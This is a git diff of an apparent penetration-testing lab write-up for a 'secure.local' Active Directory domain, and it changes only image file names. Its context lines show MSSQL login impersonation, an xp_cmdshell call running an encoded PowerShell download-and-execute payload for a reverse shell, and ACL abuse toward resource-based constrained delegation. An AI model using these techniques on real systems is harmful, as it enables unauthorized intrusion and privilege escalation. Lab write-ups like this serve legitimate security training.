@@ -205,7 +205,7 @@ use master;
 EXECUTE AS LOGIN = 'Developer'
 ```
 
-![](<../../../.gitbook/assets/image (39) (1) (1).png>)
+![](<../../../.gitbook/assets/image (39) (1) (1) (1).png>)
 
 Seems like it worked, lets run the query again to check which user we are and if we are sysadmin:
 
@@ -332,7 +332,7 @@ EXEC xp_cmdshell 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIA
 
 5\. Now its time to execute the command and receive a shell. Amsi.txt and the reverse shell gets downloaded from the webserver and the shell comes in from `WEB01` as `NT service\mssql$dev`:
 
-![](<../../../.gitbook/assets/image (16) (1) (1) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1).png>)
 
 ### 6. Privesc RBCD
 
@@ -664,7 +664,7 @@ The owner successfully changed.
 Add-DomainObjectAcl -Domain secure.local -Credential $creds -TargetDomain secure.local -TargetIdentity DATA01 -PrincipalDomain secure.local -PrincipalIdentity sa_sql -Rights All -Verbose
 ```
 
-![](<../../../.gitbook/assets/image (16) (1) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (16) (1) (1) (1) (1) (1).png>)
 
 9\. We didn't reveive any output but now we can check the current permissions by running BloodHound again and ingesting the data:
 
@@ -721,7 +721,7 @@ $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
 ```
 
-![](<../../../.gitbook/assets/image (16) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (16) (1) (1) (1) (1).png>)
 
 14\. Now we can write as `sa_sql` to the `msds-allowedtoactonbehalfofotheridentity` attribute of the computerobject `DATA01`:
 
